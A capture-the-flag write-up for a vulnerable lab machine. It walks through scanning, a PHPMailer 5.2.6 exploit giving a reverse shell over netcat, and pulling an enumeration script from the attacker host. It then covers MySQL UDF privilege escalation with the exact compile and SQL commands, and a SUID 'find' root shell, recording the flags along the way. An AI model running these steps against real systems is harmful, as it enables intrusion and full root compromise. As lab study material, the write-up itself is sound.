1.) Reconnaissance
  nmap shows ssh open, a wordpress site on 80, and rpc on 111, and listening on 57528
  wpscan shows they're using twentyseventeen which is vulnerable somehow
  dirb shows among other things a /vendor which has a PATH directory which has the first flag
FLAG1{a2c1f66d2b8051bd3a5874b5b6e43e21}
  In the vendor folder, there's a VERSION which shows its running phpmailer 5.2.6 which is vulnerable
  Searchsploiting it gives us a python exploit that works
  Make the following changes:
    add "coding: utf-8" to the top
    change the target IP to the target ip
    change backdoor to /shell.php
    change the payload IP to attacker IP
    change directory to /var/www/html/shell.php
  If needed, pip3 missing libraries
  run with python3, open a nc, then open raven.local/shell.php
  Optionally, run python -c 'import pty;pty.spawn("/bin/bash")' for a bash shell
  navigate to /var/www to collect:
FLAG2{6a8ed560f0b5358ecf844108048eb337}
  going to /var/www/html/wordpress now to look for credentials
  wp-config.php has the mysql root password
  attacking machine: clone LinEnum.sh and host it with python3
  target machine: wget it in the /tmp directory, chmod, then run
  there's a privesc vulnerability running from root on mysql
  Here's where things get weird
  the exploit is a udf dynamic library exploit(1518.c)
  complile it with:
    gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
  wget the .so file on the target system
  log in to the mysql as root and "use mysql"
  "create table table(line blob);"
  "insert into table values(load_file('/tmp/1518.so'));"
  "select * from table into dumpfile '/usr/lib/mysql/plugin/1518.so';"
  "create function do_system returns integer soname '1518.so';"
  "select do_system('chmod u+s /usr/bin/find');"
  exit mysql and touch file
  next, use find file -exec "whoami" \; which returns root
  find file -exec "/bin/sh" \;
  cd /root
  ls
  cat flag.txt
FLAG4{df2bc5e951d91581467bb9a2a8ff4425}
  also flag3 is in /var/www/html/wordpress/wp-content/uploads/2018/11 as a png
  cp/mv to /html and navigate to it
flag3{a0f568aa9de277887f37730d71520d9b}
